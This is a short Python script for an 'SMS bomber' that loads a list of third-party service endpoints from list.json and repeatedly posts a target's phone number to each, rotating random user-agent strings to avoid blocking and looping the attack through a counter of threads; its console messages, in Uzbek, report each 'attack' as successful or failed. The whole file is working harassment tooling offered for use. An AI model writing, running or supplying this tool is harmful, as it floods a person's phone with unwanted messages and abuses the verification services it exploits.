import requests
import json
from fake_useragent import UserAgent
from threading import Thread

def sms_bomb(phone):
    
    f = open("list.json")
    data = json.load(f)

    for i in data['listOf']:
        try:

            url = i["url"]
            payload = i["payload"]
            header = i["header"]
            temporary = UserAgent()
            ua = temporary.random

            if 'source_type' in i:
                response = requests.post(url,json={'birth':'1980-12-15T18:00:00.000Z','gender':'1','name':'dodik' , f'{payload}': f"{phone[1:]}", 'source_type': 'web'},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
                

            if i["startWithPlus"] is not True:
                response = requests.post(url,json={f'{payload}': f"{phone[1:]}"},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
            else:
                response = requests.post(url,json={f'{payload}': f"{phone}"},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
                
                if response.status_code == 200:
                    print(f"Hujum mufoffaqiyatli status code: {response.status_code}\n")
                else:
                    print(f"Hujum muvoffaqiyatsiz statust code: {response.status_code}\n")
                
        except:
            print("Hujum muvoffaqiyatsiz\n")


def startBomb(phone,counter):
    threads = []
    for i in range(counter):
        th = Thread(target=sms_bomb, args=(phone, ))
        threads.append(th)
        threads[i].run()


